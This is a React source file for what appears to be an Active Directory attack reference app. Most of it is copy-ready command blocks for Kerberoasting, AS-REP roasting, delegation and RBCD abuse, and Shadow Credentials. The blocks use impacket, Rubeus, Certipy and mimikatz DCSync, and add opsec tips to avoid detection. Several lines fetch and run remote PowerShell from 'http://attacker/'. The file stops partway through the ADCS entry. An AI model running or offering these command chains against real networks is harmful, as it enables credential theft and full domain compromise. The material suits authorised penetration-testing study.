import React, { useState } from 'react';
import MapNode from '../components/MapNode';
import AddCardModal from '../components/AddCardModal';
import DraggableCardList from '../components/DraggableCardList';
import { usePageStorage } from '../hooks/usePageStorage';
import { Plus, X } from 'lucide-react';

const initialMapColumns = [
  {
    header: 'KERBEROS',
    color: 'yellow',
    nodes: [
      { title: 'Kerberoasting', subtitle: 'SPN enum • TGS request • hashcat 13100', id: 'kerberoast' },
      { title: 'AS-REP Roasting', subtitle: 'No pre-auth • GetNPUsers • hashcat 18200', id: 'asrep' },
      { title: 'Unconstrained Delegation', subtitle: 'TGT capture • printer bug • coercion', id: 'unconstrained' },
      { title: 'Constrained Delegation', subtitle: 'S4U2Proxy • S4U2Self • altservice', id: 'constrained' },
      { title: 'RBCD', subtitle: 'GenericWrite • MachineAccountQuota • S4U', id: 'rbcd' },
      { title: 'Shadow Credentials', subtitle: 'msDS-KeyCredentialLink • PKINIT', id: 'shadow-creds' },
    ]
  },
  {
    header: 'CERT & POLICY',
    color: 'cyan',
    nodes: [
      { title: 'ADCS (ESC1-13)', subtitle: 'Cert templates • CA abuse • PKINIT', id: 'adcs' },
      { title: 'Group Policy', subtitle: 'Modify GPO • credentials in GPO • SYSVOL', id: 'gpo' },
      { title: 'ACL Abuse', subtitle: 'GenericAll • WriteDACL • WriteOwner', id: 'acl-abuse' },
    ]
  },
  {
    header: 'SCHEMA & FOREST',
    color: 'purple',
    nodes: [
      { title: 'Global Schema Abuse', subtitle: 'Schema Admin • attribute injection • persistence', id: 'schema-abuse' },
    ]
  },
  {
    header: 'SERVICES & INFRA',
    color: 'orange',
    nodes: [
      { title: 'MSSQL', subtitle: 'Impersonation • xp_cmdshell • linked servers', id: 'mssql' },
      { title: 'SCCM / MCM', subtitle: 'NAA creds • CMPivot • lateral move', id: 'sccm' },
      { title: 'LAPS', subtitle: 'ms-Mcs-AdmPwd • backdoors • expiry spoof', id: 'laps' },
      { title: 'Exchange / PrivExchange', subtitle: 'EWS relay • mailbox delegation abuse', id: 'exchange' },
    ]
  },
  {
    header: 'TRUSTS & COERCION',
    color: 'green',
    nodes: [
      { title: 'noPAC / samAccountName', subtitle: 'CVE-2021-42278/42287 • ticket forgery', id: 'nopac' },
      { title: 'Forest & Domain Trusts', subtitle: 'SID history • TDO abuse • inter-realm', id: 'trusts' },
      { title: 'Azure AD Hybrid', subtitle: 'PTA • ADFS • AADConnect abuse', id: 'azure-hybrid' },
      { title: 'PrintNightmare / Coercion', subtitle: 'MS-RPRN • MS-EFSRPC • PetitPotam', id: 'coercion' },
      { title: 'RBCD Deep Dive', subtitle: 'Computer quota • GenericWrite paths', id: 'rbcd-deep' },
    ]
  },
];

const techniques = [
  // === KERBEROS ===
  {
    id: 'kerberoast',
    title: 'Kerberoasting',
    subtitle: 'Request TGS tickets for SPN accounts and crack offline',
    tags: ['Kerberoasting', 'SPN', 'TGS', 'Rubeus', 'impacket', 'netexec', 'hashcat 13100', 'service accounts'],
    accentColor: 'yellow',
    overview: 'Kerberoasting exploits the fact that any authenticated domain user can request a Kerberos TGS ticket for any service with a registered SPN. The ticket is encrypted with the service account\'s NTLM hash — the attacker captures it and cracks it offline. Service accounts often have weak or old passwords set by admins. RC4 tickets (etype 23) are weaker and faster to crack than AES-256. Can be performed remotely from Linux with impacket/netexec, or on-prem from a beacon using Rubeus/PowerView.',
    steps: [
      'ENUMERATE (remote): impacket-GetUserSPNs or netexec ldap — query LDAP from Linux without touching the target host',
      'ENUMERATE (on-prem): PowerView Get-DomainUser -SPN or ADSearch from a beacon — LDAP queries run in-memory',
      'REQUEST (remote): impacket-GetUserSPNs -request — authenticates to KDC from Linux and outputs tickets directly in hashcat format',
      'REQUEST (on-prem): Rubeus kerberoast — runs via execute-assembly, outputs base64 tickets; use /rc4opsec /tgtdeleg to downgrade to RC4',
      'TARGETED: if you have GenericWrite on a user, set an SPN with Set-DomainObject, roast that specific account, then clear the SPN — avoids touching high-noise all-user queries',
      'CRACK: hashcat -m 13100 for RC4 (krb5tgs$23), -m 19700 for AES-256 (krb5tgs$18) — RC4 cracks orders of magnitude faster',
    ],
    commands: [
      {
        title: 'Remote — impacket & netexec (from Linux, no foothold needed)',
        code: `# ── impacket-GetUserSPNs ─────────────────────────────────────────────────────
# Enumerate SPN accounts only (no tickets)
impacket-GetUserSPNs corp.local/user:Password -dc-ip DC01

# Request all tickets — outputs hashcat-ready hashes
impacket-GetUserSPNs corp.local/user:Password -dc-ip DC01 -request -outputfile kerberoast.txt

# Target a specific user
impacket-GetUserSPNs corp.local/user:Password -dc-ip DC01 -request-user svc-sql

# With NTLM hash (pass-the-hash — no plaintext needed)
impacket-GetUserSPNs corp.local/user -hashes :NTLM_HASH -dc-ip DC01 -request

# With Kerberos ticket (pass-the-ticket)
export KRB5CCNAME=user.ccache
impacket-GetUserSPNs corp.local/user -k -no-pass -dc-ip DC01 -request

# ── netexec ldap ──────────────────────────────────────────────────────────────
# Enumerate and dump all Kerberoastable accounts
nxc ldap DC01 -u user -p Password -d corp.local --kerberoasting kerberoast.txt

# With hash
nxc ldap DC01 -u user -H :NTLM_HASH -d corp.local --kerberoasting kerberoast.txt`
      },
      {
        title: 'On-Prem — Rubeus & PowerView (from beacon / domain-joined host)',
        code: `# ── Enumerate SPN accounts ───────────────────────────────────────────────────
# PowerView (in-memory, no disk write)
IEX (New-Object Net.WebClient).DownloadString('http://attacker/PowerView.ps1')
Get-DomainUser -SPN | Select-Object samaccountname, serviceprincipalname, pwdlastset, memberof

# ADSearch (lightweight LDAP — lower footprint than PowerView)
execute-assembly /tools/ADSearch.exe \
  --search "(&(objectCategory=user)(servicePrincipalName=*))" \
  --attributes samaccountname,serviceprincipalname,pwdlastset

# ── Kerberoast with Rubeus ─────────────────────────────────────────────────────
# All SPN accounts — RC4 downgrade for faster cracking
execute-assembly /tools/Rubeus.exe kerberoast /nowrap
execute-assembly /tools/Rubeus.exe kerberoast /rc4opsec /nowrap        # Prefer RC4 where possible
execute-assembly /tools/Rubeus.exe kerberoast /tgtdeleg /rc4opsec /nowrap  # Delegate TGT to force RC4

# Target specific user
execute-assembly /tools/Rubeus.exe kerberoast /user:svc-sql /nowrap
execute-assembly /tools/Rubeus.exe kerberoast /user:svc-sql /rc4opsec /nowrap

# Save to file on disk (if output redirection needed)
execute-assembly /tools/Rubeus.exe kerberoast /outfile:C:\\Windows\\Temp\\hashes.txt

# ── Targeted Kerberoasting (requires GenericWrite on user) ────────────────────
# Add fake SPN → roast → remove SPN (avoids noisy all-user query)
Set-DomainObject -Identity TargetUser -Set @{serviceprincipalname='fake/temp.corp.local'}
execute-assembly /tools/Rubeus.exe kerberoast /user:TargetUser /rc4opsec /nowrap
Set-DomainObject -Identity TargetUser -Clear serviceprincipalname

# ── Crack ──────────────────────────────────────────────────────────────────────
hashcat -m 13100 kerberoast.txt rockyou.txt                     # RC4 (krb5tgs$23) — fast
hashcat -m 19700 kerberoast.txt rockyou.txt                     # AES-256 (krb5tgs$18) — slow
hashcat -m 13100 kerberoast.txt rockyou.txt -r rules/best64.rule
hashcat -m 13100 kerberoast.txt rockyou.txt -a 3 ?u?l?l?l?d?d?d?d  # Mask attack`
      }
    ]
  },
  {
    id: 'asrep',
    title: 'AS-REP Roasting',
    subtitle: 'Extract and crack hashes from accounts with Kerberos pre-authentication disabled',
    tags: ['AS-REP Roasting', 'no pre-auth', 'Rubeus', 'GetNPUsers', 'netexec', 'hashcat 18200'],
    accentColor: 'yellow',
    overview: 'AS-REP roasting targets accounts with "Do not require Kerberos preauthentication" (DONT_REQ_PREAUTH) set. Without pre-authentication, the KDC returns an AS-REP encrypted with the account\'s hash in response to any request — no credentials needed to trigger it. Crucially, this also works unauthenticated from the network with only a username wordlist — making it a viable pre-foothold technique. Crack the encrypted blob with hashcat mode 18200.',
    steps: [
      'ENUMERATE (remote): impacket-GetNPUsers with creds auto-discovers vulnerable accounts; netexec ldap --asreproast for one-liner dump',
      'ENUMERATE (on-prem): PowerView Get-DomainUser -PreauthNotRequired or ADSearch UAC bit filter (flag 4194304)',
      'REQUEST (unauthenticated): impacket-GetNPUsers with a username list and no creds — valid from outside the domain, useful at initial access stage',
      'REQUEST (on-prem): Rubeus asreproast via execute-assembly — runs entirely in memory, outputs hashcat-format hashes',
      'FORCE the condition: if you have GenericWrite on a user, enable DONT_REQ_PREAUTH with Set-DomainObject, roast, then disable — targeted AS-REP',
      'CRACK: hashcat -m 18200 — these hashes crack faster than Kerberoast tickets because the encrypted blob is smaller',
    ],
    commands: [
      {
        title: 'Remote — impacket & netexec (from Linux)',
        code: `# ── impacket-GetNPUsers ──────────────────────────────────────────────────────
# With credentials — auto-enumerate vulnerable accounts and dump hashes
impacket-GetNPUsers corp.local/user:Password -request -format hashcat -dc-ip DC01
impacket-GetNPUsers corp.local/user:Password -request -outputfile asrep.txt -dc-ip DC01

# WITHOUT credentials — requires username list (unauthenticated AS-REP roast)
impacket-GetNPUsers corp.local/ -usersfile users.txt -format hashcat -outputfile asrep.txt -dc-ip DC01
impacket-GetNPUsers corp.local/ -no-pass -usersfile users.txt -dc-ip DC01

# With NTLM hash
impacket-GetNPUsers corp.local/user -hashes :NTLM_HASH -request -dc-ip DC01

# With Kerberos ticket
export KRB5CCNAME=user.ccache
impacket-GetNPUsers corp.local/user -k -no-pass -request -dc-ip DC01

# ── netexec ldap ──────────────────────────────────────────────────────────────
nxc ldap DC01 -u user -p Password -d corp.local --asreproast asrep.txt
nxc ldap DC01 -u user -H :NTLM_HASH -d corp.local --asreproast asrep.txt

# ── Crack ──────────────────────────────────────────────────────────────────────
hashcat -m 18200 asrep.txt rockyou.txt
hashcat -m 18200 asrep.txt rockyou.txt -r rules/best64.rule`
      },
      {
        title: 'On-Prem — Rubeus & PowerView (from beacon)',
        code: `# ── Enumerate accounts without pre-auth ──────────────────────────────────────
# PowerView
IEX (New-Object Net.WebClient).DownloadString('http://attacker/PowerView.ps1')
Get-DomainUser -PreauthNotRequired | Select-Object samaccountname, description, memberof

# ADSearch (LDAP filter: UAC flag 4194304 = DONT_REQ_PREAUTH)
execute-assembly /tools/ADSearch.exe \
  --search "(&(objectCategory=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))" \
  --attributes samaccountname,description

# ── AS-REP roast with Rubeus ──────────────────────────────────────────────────
# All accounts with pre-auth disabled
execute-assembly /tools/Rubeus.exe asreproast /nowrap
execute-assembly /tools/Rubeus.exe asreproast /format:hashcat /nowrap

# Target specific user
execute-assembly /tools/Rubeus.exe asreproast /user:nopreauth /format:hashcat /nowrap

# ── Targeted AS-REP (force the condition via GenericWrite) ────────────────────
# Enable DONT_REQ_PREAUTH on a target user you have GenericWrite over
Set-DomainObject -Identity TargetUser \
  -XOR @{useraccountcontrol=4194304}   # Toggle DONT_REQ_PREAUTH bit ON
# Roast
execute-assembly /tools/Rubeus.exe asreproast /user:TargetUser /format:hashcat /nowrap
# Restore immediately
Set-DomainObject -Identity TargetUser \
  -XOR @{useraccountcontrol=4194304}   # Toggle bit OFF again

# ── Crack ──────────────────────────────────────────────────────────────────────
hashcat -m 18200 asrep.txt rockyou.txt
hashcat -m 18200 asrep.txt rockyou.txt -r rules/best64.rule`
      }
    ]
  },
  {
    id: 'unconstrained',
    title: 'Unconstrained Delegation',
    subtitle: 'Capture TGTs on hosts with unconstrained delegation enabled via coercion',
    tags: ['unconstrained delegation', 'TGT capture', 'printer bug', 'SpoolSample', 'Rubeus monitor', 'netexec', 'impacket'],
    accentColor: 'yellow',
    overview: 'Unconstrained delegation: when enabled on a computer account, the KDC includes the authenticating user\'s full TGT in the service ticket — that TGT is then cached in LSASS on the server. Coerce a Domain Controller to authenticate to a compromised UD host (Printer Bug, PetitPotam) and its TGT is captured — enabling DCSync. Remote enumeration via impacket/netexec identifies UD hosts and can coerce from Linux; on-prem exploitation uses Rubeus monitor mode to capture arriving TGTs.',
    steps: [
      'ENUMERATE (remote): impacket-findDelegation or netexec ldap --trusted-for-delegation — queries LDAP from Linux for UAC flag 524288',
      'ENUMERATE (on-prem): PowerView Get-DomainComputer -Unconstrained or ADSearch — excludes DCs which have it by default',
      'COERCE (remote): PetitPotam / Coercer from Linux — point authentication at UD host IP or hostname',
      'CAPTURE (on-prem): Rubeus monitor /targetuser:DC01$ running on the UD host — watches LSASS for incoming TGTs',
      'EXPLOIT: inject captured DC TGT with Rubeus ptt → run DCSync via mimikatz or secretsdump',
      'OPSEC NOTE: Rubeus harvest mode is noisier than monitor — use monitor with /targetuser to limit scope',
    ],
    commands: [
      {
        title: 'Remote — impacket & netexec enumeration + coercion',
        code: `# ── Enumerate UD hosts from Linux ────────────────────────────────────────────
# impacket-findDelegation — enumerate all delegation types
impacket-findDelegation corp.local/user:Password -dc-ip DC01
# Look for: TRUSTED_FOR_DELEGATION (unconstrained), no AllowedDelegate value

# netexec ldap — one-liner UD host enumeration
nxc ldap DC01 -u user -p Password -d corp.local --trusted-for-delegation

# ── Coerce DC from Linux (point at UD host) ───────────────────────────────────
# PetitPotam — MS-EFSRPC, no Spooler required
python3 PetitPotam.py -u user -p Password UDHOST.corp.local DC01.corp.local

# Coercer — try all known coercion protocols
pip3 install coercer
coercer coerce -t DC01.corp.local -l UDHOST.corp.local -u user -p Password -d corp.local

# SpoolSample — MS-RPRN (requires Print Spooler on target DC)
python3 SpoolSample.py corp.local/user:Password UDHOST.corp.local DC01.corp.local

# ── After TGT capture: DCSync from Linux ─────────────────────────────────────
# (Extract .kirbi ticket from Rubeus output, convert to ccache)
python3 ticketConverter.py DC01.kirbi DC01.ccache
export KRB5CCNAME=DC01.ccache
impacket-secretsdump -k -no-pass DC01.corp.local -just-dc`
      },
      {
        title: 'On-Prem — Rubeus monitor + coercion (from UD host beacon)',
        code: `# ── Step 1: Enumerate UD hosts from beacon ───────────────────────────────────
# PowerView
IEX (New-Object Net.WebClient).DownloadString('http://attacker/PowerView.ps1')
Get-DomainComputer -Unconstrained | Select-Object dnshostname
# Exclude DCs — they have UD by default and aren't useful targets
Get-DomainComputer -Unconstrained | Where-Object { $_.dnshostname -notlike "*DC*" }

# ADSearch
execute-assembly /tools/ADSearch.exe \
  --search "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))" \
  --attributes dnshostname,operatingsystem

# ── Step 2: Start TGT monitor on the UD host beacon ──────────────────────────
# Monitor mode — watch LSASS for new TGTs arriving (targeted, less noisy)
execute-assembly /tools/Rubeus.exe monitor /interval:5 /nowrap /targetuser:DC01$
# For any DA: /targetuser:Administrator
# Without filter (all TGTs): omit /targetuser

# ── Step 3: Trigger coercion ──────────────────────────────────────────────────
# From another beacon or Linux — coerce DC to authenticate to UD host
execute-assembly /tools/SpoolSample.exe DC01.corp.local UDHOST.corp.local

# ── Step 4: Inject captured TGT + DCSync ─────────────────────────────────────
# Paste base64 ticket from Rubeus monitor output
execute-assembly /tools/Rubeus.exe ptt /ticket:<BASE64_TGT_FROM_MONITOR>

# Verify ticket injected
execute-assembly /tools/Rubeus.exe klist

# DCSync using injected TGT
mimikatz lsadump::dcsync /domain:corp.local /user:krbtgt
mimikatz lsadump::dcsync /domain:corp.local /all /csv`
      }
    ]
  },
  {
    id: 'constrained',
    title: 'Constrained Delegation (S4U2Proxy / S4U2Self)',
    subtitle: 'Abuse constrained delegation to request service tickets as any user to specific services',
    tags: ['constrained delegation', 'S4U2Proxy', 'S4U2Self', 'Rubeus', 'impacket getST', 'netexec', 'altservice', 'protocol transition'],
    accentColor: 'yellow',
    overview: 'Constrained delegation allows a service account to impersonate users only to specific target services listed in msDS-AllowedToDelegateTo. S4U2Self gets a service ticket for any user to the delegating account itself; S4U2Proxy exchanges it for a TGS to the permitted target service. The /altservice flag renames the service class in the ticket (cifs → host on the same machine) granting broader access. Both impacket getST and Rubeus implement the full S4U chain — choose based on whether you\'re remote or on-prem.',
    steps: [
      'ENUMERATE (remote): impacket-findDelegation or netexec ldap --find-delegation — lists msDS-AllowedToDelegateTo values from Linux',
      'ENUMERATE (on-prem): PowerView Get-DomainUser/Computer -TrustedToAuth, BloodHound "Find Constrained Delegation" query',
      'EXPLOIT (remote): impacket-getST -spn cifs/target -impersonate Administrator — full S4U chain from Linux with password or hash',
      'EXPLOIT (on-prem): Rubeus asktgt then s4u /msdsspn /impersonateuser — runs via execute-assembly, injects ticket directly with /ptt',
      'ALTSERVICE: when delegated to cifs/server, use /altservice:host (or ldap, http, wsman) to access additional services on the same machine',
      'PROTOCOL TRANSITION (Any Auth): if TrustedToAuthForDelegation is set, S4U2Self works for ANY user — no prior Kerberos auth needed',
    ],
    commands: [
      {
        title: 'Remote — impacket & netexec (from Linux)',
        code: `# ── Enumerate constrained delegation from Linux ───────────────────────────────
# impacket-findDelegation — shows all delegation types including AllowedToDelegateTo
impacket-findDelegation corp.local/user:Password -dc-ip DC01
# Look for: CONSTRAINED + msDS-AllowedToDelegateTo entries

# netexec ldap
nxc ldap DC01 -u user -p Password -d corp.local --find-delegation

# ── impacket-getST — full S4U chain from Linux ────────────────────────────────
# With password
impacket-getST -spn cifs/fileserver.corp.local \
  -impersonate Administrator \
  corp.local/svc-iis:Password -dc-ip DC01

# With NTLM hash (no plaintext needed)
impacket-getST -spn cifs/fileserver.corp.local \
  -impersonate Administrator \
  -hashes :NTLM_HASH \
  corp.local/svc-iis -dc-ip DC01

# With altservice (rename service class — same host)
impacket-getST -spn cifs/fileserver.corp.local \
  -impersonate Administrator \
  -altservice host \
  corp.local/svc-iis:Password -dc-ip DC01

# Use the resulting ticket
export KRB5CCNAME=Administrator.ccache
impacket-psexec -k -no-pass fileserver.corp.local
impacket-smbexec -k -no-pass fileserver.corp.local
impacket-wmiexec -k -no-pass fileserver.corp.local
impacket-secretsdump -k -no-pass fileserver.corp.local`
      },
      {
        title: 'On-Prem — Rubeus S4U chain (from beacon)',
        code: `# ── Enumerate constrained delegation from beacon ────────────────────────────
# PowerView
IEX (New-Object Net.WebClient).DownloadString('http://attacker/PowerView.ps1')
Get-DomainUser -TrustedToAuth | Select-Object samaccountname, 'msds-allowedtodelegateto'
Get-DomainComputer -TrustedToAuth | Select-Object dnshostname, 'msds-allowedtodelegateto'

# ADSearch
execute-assembly /tools/ADSearch.exe \
  --search "(&(objectCategory=user)(msDS-AllowedToDelegateTo=*))" \
  --attributes samaccountname,msDS-AllowedToDelegateTo
execute-assembly /tools/ADSearch.exe \
  --search "(&(objectCategory=computer)(msDS-AllowedToDelegateTo=*))" \
  --attributes dnshostname,msDS-AllowedToDelegateTo

# ── Step 1: Get TGT for the delegating account ────────────────────────────────
# With NTLM hash
execute-assembly /tools/Rubeus.exe asktgt \
  /user:svc-iis /rc4:NTLM_HASH /domain:corp.local /nowrap
# With AES256 hash (less noisy)
execute-assembly /tools/Rubeus.exe asktgt \
  /user:svc-iis /aes256:AES_HASH /domain:corp.local /opsec /nowrap

# ── Step 2: S4U2Self + S4U2Proxy — impersonate DA ────────────────────────────
execute-assembly /tools/Rubeus.exe s4u \
  /ticket:<BASE64_TGT> \
  /impersonateuser:Administrator \
  /domain:corp.local \
  /msdsspn:cifs/fileserver.corp.local \
  /ptt /nowrap

# ── Alternate service (same host, different service class) ────────────────────
execute-assembly /tools/Rubeus.exe s4u \
  /ticket:<BASE64_TGT> \
  /impersonateuser:Administrator \
  /msdsspn:cifs/fileserver.corp.local \
  /altservice:host,wsman,ldap \
  /ptt /nowrap

# ── Verify and access ─────────────────────────────────────────────────────────
execute-assembly /tools/Rubeus.exe klist
ls \\fileserver.corp.local\C$
winrs -r:fileserver.corp.local cmd`
      }
    ]
  },
  {
    id: 'rbcd',
    title: 'Resource-Based Constrained Delegation (RBCD)',
    subtitle: 'Write msDS-AllowedToActOnBehalfOfOtherIdentity to gain delegation rights to any service on a computer',
    tags: ['RBCD', 'msDS-AllowedToActOnBehalfOfOtherIdentity', 'GenericWrite', 'MachineAccountQuota', 'Rubeus S4U', 'impacket', 'netexec'],
    accentColor: 'yellow',
    overview: 'RBCD inverts traditional delegation — the target resource controls who can delegate to it via msDS-AllowedToActOnBehalfOfOtherIdentity. With GenericWrite over a computer object, write your controlled account\'s SID to that attribute, then run S4U2Self+S4U2Proxy to impersonate any user to services on the target. The full attack chain is achievable entirely from Linux with impacket+bloodyad, or on-prem via Powermad+PowerView+Rubeus from a beacon.',
    steps: [
      'PREREQUISITE: GenericAll, GenericWrite, WriteProperty, or Owns on the target computer object — find via BloodHound',
      'NEED AN SPN: use MachineAccountQuota (default 10) to create a computer account, or use an existing compromised machine account',
      'WRITE RBCD (remote): impacket rbcd.py or bloodyad — write attacker SID to target\'s msDS-AllowedToActOnBehalfOfOtherIdentity via LDAP',
      'WRITE RBCD (on-prem): Powermad + PowerView Set-DomainObject — create computer account and write RBCD from beacon',
      'S4U CHAIN (remote): impacket-getST -spn cifs/target -impersonate Administrator — full chain from Linux with password or hash',
      'S4U CHAIN (on-prem): Rubeus asktgt then s4u — run via execute-assembly, inject ticket with /ptt for seamless access',
      'CLEANUP: clear msDS-AllowedToActOnBehalfOfOtherIdentity and delete attacker computer account after exploitation',
    ],
    commands: [
      {
        title: 'Remote — impacket & bloodyad (full chain from Linux)',
        code: `# ── Step 1: Enumerate write rights on computer objects ────────────────────────
impacket-findDelegation corp.local/user:Password -dc-ip DC01
# Or check with bloodyad:
bloodyad -d corp.local -u user -p Password --host DC01 get writable --filter "objectClass=computer"

# ── Step 2: Create attacker computer account from Linux ───────────────────────
impacket-addcomputer corp.local/user:Password \
  -computer-name ATTACKER \
  -computer-pass 'Pass123!' \
  -dc-ip DC01
# Note the SID of ATTACKER$ for the next step

# ── Step 3: Write RBCD on target via impacket rbcd.py ────────────────────────
# rbcd.py: https://github.com/tothi/rbcd-attack
python3 rbcd.py -f ATTACKER -t TARGET -dc-ip DC01 corp.local/user:Password

# Or via bloodyad (cleaner syntax):
bloodyad -d corp.local -u user -p Password --host DC01 \
  set rbcd TARGET ATTACKER$

# ── Step 4: Full S4U chain via impacket-getST ─────────────────────────────────
impacket-getST \
  -spn cifs/TARGET.corp.local \
  -impersonate Administrator \
  corp.local/ATTACKER$:'Pass123!' \
  -dc-ip DC01

# With NTLM hash
impacket-getST \
  -spn cifs/TARGET.corp.local \
  -impersonate Administrator \
  -hashes :NTLM_HASH \
  corp.local/ATTACKER$ \
  -dc-ip DC01

# ── Step 5: Use the ticket ────────────────────────────────────────────────────
export KRB5CCNAME=Administrator@cifs_TARGET.corp.local@CORP.LOCAL.ccache
impacket-psexec -k -no-pass TARGET.corp.local
impacket-wmiexec -k -no-pass TARGET.corp.local
impacket-secretsdump -k -no-pass TARGET.corp.local

# ── Cleanup ───────────────────────────────────────────────────────────────────
# Remove RBCD attribute
bloodyad -d corp.local -u user -p Password --host DC01 \
  remove rbcd TARGET ATTACKER$
# Delete attacker computer account
impacket-addcomputer corp.local/user:Password \
  -computer-name ATTACKER -delete -dc-ip DC01`
      },
      {
        title: 'On-Prem — Powermad + PowerView + Rubeus (from beacon)',
        code: `# ── Step 1: Check MachineAccountQuota ────────────────────────────────────────
Get-DomainObject -Identity "DC=corp,DC=local" -Properties ms-ds-machineaccountquota
# Must be > 0 (default 10)

# ── Step 2: Create attacker computer account via Powermad ────────────────────
IEX (New-Object Net.WebClient).DownloadString('http://attacker/Powermad.ps1')
New-MachineAccount -MachineAccount "ATTACKER" \
  -Password (ConvertTo-SecureString 'Pass123!' -AsPlainText -Force)
$AttackerSID = (Get-DomainComputer ATTACKER -Properties objectsid).objectsid
Write-Host "ATTACKER SID: $AttackerSID"

# ── Step 3: Write RBCD on target via PowerView ────────────────────────────────
$SD = New-Object Security.AccessControl.RawSecurityDescriptor \
  "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$AttackerSID)"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
Get-DomainComputer TARGET | Set-DomainObject \
  -Set @{'msds-allowedtoactonbehalfofotheridentity' = $SDBytes}

# Verify it was written
Get-DomainComputer TARGET -Properties 'msds-allowedtoactonbehalfofotheridentity'

# ── Step 4: Get TGT for ATTACKER$ ────────────────────────────────────────────
execute-assembly /tools/Rubeus.exe asktgt \
  /user:ATTACKER$ /password:Pass123! /domain:corp.local /nowrap

# ── Step 5: S4U2Self + S4U2Proxy as Administrator ────────────────────────────
execute-assembly /tools/Rubeus.exe s4u \
  /ticket:<BASE64_TGT> \
  /impersonateuser:Administrator \
  /msdsspn:cifs/TARGET.corp.local \
  /ptt /nowrap

# Verify
execute-assembly /tools/Rubeus.exe klist
ls \\TARGET.corp.local\C$

# ── Cleanup ───────────────────────────────────────────────────────────────────
Set-DomainObject TARGET -Clear 'msds-allowedtoactonbehalfofotheridentity'
# Delete attacker computer account
Set-DomainObject ATTACKER$ -Set @{useraccountcontrol=4098}   # Disable first
# Then delete via ADSI or AD module`
      }
    ]
  },
  {
    id: 'shadow-creds',
    title: 'Shadow Credentials',
    subtitle: 'Add a Key Credential to a target account to obtain a TGT via PKINIT without knowing the password',
    tags: ['Shadow Credentials', 'msDS-KeyCredentialLink', 'PKINIT', 'Whisker', 'Certipy', 'bloodyad', 'NT hash'],
    accentColor: 'yellow',
    overview: 'Shadow Credentials abuses the msDS-KeyCredentialLink attribute, which stores certificate-based credentials for PKINIT. Writing a certificate (key credential) to this attribute allows authenticating as the target account without knowing its password. UnPAC-the-Hash (/getcredentials) extracts the NT hash from the PAC — turning a GenericWrite into a full pass-the-hash. Requires a DC running Windows Server 2016+ or with PKINIT (PKI) deployed. Certipy shadow handles the full chain from Linux; Whisker handles it on-prem.',
    steps: [
      'PREREQUISITE: GenericAll or GenericWrite on the target user/computer account — or self-write on msDS-KeyCredentialLink',
      'EXPLOIT (remote): certipy shadow auto — generates cert, writes to target, authenticates, extracts NT hash — all in one command from Linux',
      'EXPLOIT (on-prem): Whisker add — generates key credential, writes it, outputs Rubeus asktgt command ready to paste',
      'AUTHENTICATE: Rubeus asktgt /certificate /getcredentials — PKINIT auth returns TGT + NT hash via UnPAC-the-Hash',
      'CLEANUP: Whisker remove /deviceid or certipy shadow clear — removes key credential to reduce evidence',
      'OPSEC: check existing key credentials before writing — if target already has one, adding another may be noticed',
    ],
    commands: [
      {
        title: 'Remote — Certipy shadow (from Linux)',
        code: `# ── Full auto chain (enumerate, write, authenticate, extract hash) ────────────
certipy shadow auto \
  -username attacker@corp.local \
  -password Password \
  -account TargetUser \
  -dc-ip DC01
# Outputs: TargetUser.pfx + NT hash directly

# ── Manual step-by-step ───────────────────────────────────────────────────────
# Step 1: List existing key credentials (check before adding)
certipy shadow list \
  -username attacker@corp.local -password Password \
  -account TargetUser -dc-ip DC01

# Step 2: Add key credential
certipy shadow add \
  -username attacker@corp.local -password Password \
  -account TargetUser -dc-ip DC01
# Outputs: TargetUser.pfx + device ID

# Step 3: Authenticate via PKINIT → get NT hash
certipy auth -pfx TargetUser.pfx -domain corp.local -dc-ip DC01
# Outputs: TargetUser.ccache + NT hash (UnPAC-the-Hash)

# Step 4: Use NT hash (pass-the-hash)
nxc smb TARGET -u TargetUser -H :NT_HASH
impacket-psexec corp.local/TargetUser -hashes :NT_HASH TARGET.corp.local

# Step 5: Cleanup
certipy shadow remove \
  -username attacker@corp.local -password Password \
  -account TargetUser \
  -device-id <DEVICE_ID_FROM_ADD> \
  -dc-ip DC01

# ── bloodyad alternative ──────────────────────────────────────────────────────
bloodyad -d corp.local -u attacker -p Password --host DC01 \
  set shadow-credentials TargetUser`
      },
      {
        title: 'On-Prem — Whisker + Rubeus (from beacon)',
        code: `# ── List existing key credentials on target ──────────────────────────────────
execute-assembly /tools/Whisker.exe list /target:TargetUser

# ── Add key credential and get Rubeus command ─────────────────────────────────
execute-assembly /tools/Whisker.exe add /target:TargetUser
# Output includes:
#   [*] KeyCredential generated — DeviceID: <GUID>
#   [*] Rubeus asktgt command:
#   Rubeus.exe asktgt /user:TargetUser /certificate:<B64> /password:<PASS> /domain:corp.local /getcredentials /nowrap

# ── Run the Rubeus command from Whisker output ────────────────────────────────
execute-assembly /tools/Rubeus.exe asktgt \
  /user:TargetUser \
  /certificate:<BASE64_CERT_FROM_WHISKER> \
  /password:<CERT_PASS_FROM_WHISKER> \
  /domain:corp.local \
  /getcredentials \
  /ptt /nowrap
# /getcredentials = UnPAC-the-Hash: extracts NT hash from PAC
# /ptt = inject ticket into current session

# ── Use extracted NT hash ─────────────────────────────────────────────────────
# PTH within beacon session:
execute-assembly /tools/Rubeus.exe pth /user:TargetUser /rc4:<NT_HASH> /nowrap

# ── Cleanup ───────────────────────────────────────────────────────────────────
execute-assembly /tools/Whisker.exe remove /target:TargetUser /deviceid:<DEVICE_ID>`
      }
    ]
  },
  // === CERT & POLICY ===
  {
    id: 'adcs',
    title: 'ADCS — All ESC Vectors (ESC1–13)',
    subtitle: 'Exploit misconfigured AD Certificate Services for privilege escalation, persistence, and domain compromise',
    tags: ['ADCS', 'ESC1', 'ESC2', 'ESC3', 'ESC4', 'ESC6', 'ESC8', 'ESC9', 'ESC10', 'ESC11', 'ESC13', 'Certipy', 'Certify'],
    accentColor: 'cyan',
    overview: 'Active Directory Certificate Services (ADCS) provides PKI infrastructure — when misconfigured, it becomes a domain privilege escalation and persistence vector. The ESC1–13 framework (Certipy, SpectreOps research) catalogues 13 distinct ADCS misconfigurations. ESC1 (SAN in template) and ESC8 (NTLM relay to HTTP enrollment) are the most commonly exploited. A stolen CA private key (golden certificate) provides indefinite persistence even after krbtgt rotation.',
    steps: [
      'ESC1: template allows SAN (Subject Alternative Name) specification by enrollee — request cert as any user including DA',
      'ESC2: template has "Any Purpose" EKU or no EKU — cert usable for any purpose including client auth',
